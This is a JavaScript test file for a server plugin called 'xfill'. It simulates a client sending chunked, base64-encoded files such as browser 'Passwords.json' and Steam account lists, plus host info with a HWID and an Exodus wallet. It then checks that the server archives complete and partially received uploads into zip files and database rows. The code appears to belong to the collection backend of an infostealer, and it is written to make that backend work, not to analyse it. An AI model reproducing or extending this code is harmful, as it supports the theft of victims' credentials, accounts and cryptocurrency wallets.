// Functional test: per-file session mode (complete + partial salvage paths).
// Run from plugins/xfill: bun partial-test.mjs
import fs from "fs";
import os from "os";
import path from "path";
import mod, { parseZip } from "./server.js";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "xfill-test-"));
const broadcasts = [];
const ctx = {
  pluginId: "xfill",
  dataDir: tmp,
  db: null,
  log: { debug() {}, info() {}, warn() {}, error() {} },
  broadcast: (ch, data) => broadcasts.push({ ch, data }),
};

const { Database } = await import("bun:sqlite");
ctx.db = new Database(":memory:");
mod.setup(ctx);

const ev = (clientId, event, payload) => mod.onEvent(ctx, clientId, event, payload);
const enc = (s) => Buffer.from(s).toString("base64");

const CLIENT = "testclient123";
const S1 = 111111;
// Session 1: two files, two chunks each — complete
for (const [file, chunks] of [["Browser_X/Passwords.json", ["[{\"Hostname\":", "\"h\",\"Username\":\"u\",\"Password\":\"p\"}]"]], ["Info.json", ["{\"a\":", "1}"]]]) {
  chunks.forEach((data, index) =>
    ev(CLIENT, "xfill_file", { session: S1, path: file, findex: 0, ftotal: 2, index, total: chunks.length, data: enc(data) })
  );
}
ev(CLIENT, "xfill_complete", { session: S1, files: 2, size: 100, info: { Username: "u", HWID: "H", DesktopWallets: ["Exodus"] } });
await new Promise((r) => setTimeout(r, 7000)); // finalize retries

// Session 2: one file complete, one file incomplete — partial salvage
const S2 = 222222;
ev(CLIENT, "xfill_file", { session: S2, path: "Browser_X/Passwords.json", findex: 0, ftotal: 3, index: 0, total: 1, data: enc("[]") });
ev(CLIENT, "xfill_file", { session: S2, path: "App_Steam/AccountsList.txt", findex: 1, ftotal: 3, index: 0, total: 2, data: enc("part") });
ev(CLIENT, "xfill_complete", { session: S2, files: 3, size: 50, info: { Username: "u2", HWID: "H2" } });
await new Promise((r) => setTimeout(r, 7000));

const rows = ctx.db.prepare("SELECT * FROM archives ORDER BY id").all();
console.log("rows:", rows.length);
if (rows.length !== 2) { console.log("FAIL: expected 2 rows"); process.exit(1); }
console.log("row1 partial:", rows[0].partial, "| row2 partial:", rows[1].partial);
if (rows[0].partial !== 0 || rows[1].partial !== 1) { console.log("FAIL: partial flags wrong"); process.exit(1); }

// verify row1 zip parses and contains both files
const z1 = fs.readFileSync(path.join(tmp, CLIENT, `${S1}.zip`));
const zip = parseZip(z1);
const names = zip.entries.map((e) => e.path).sort();
console.log("row1 entries:", names);
if (!names.includes("Browser_X/Passwords.json") || !names.includes("Info.json")) { console.log("FAIL: missing entries"); process.exit(1); }

// row2 partial zip contains the one complete file
const z2 = fs.readFileSync(path.join(tmp, CLIENT, `${S2}.zip`));
const names2 = parseZip(z2).entries.map((e) => e.path).sort();
console.log("row2 entries:", names2);
if (!names2.includes("Browser_X/Passwords.json")) { console.log("FAIL: partial missing complete file"); process.exit(1); }

console.log("tags row1:", rows[0].tags);
console.log("ALL PASS");
fs.rmSync(tmp, { recursive: true, force: true });
process.exit(0);
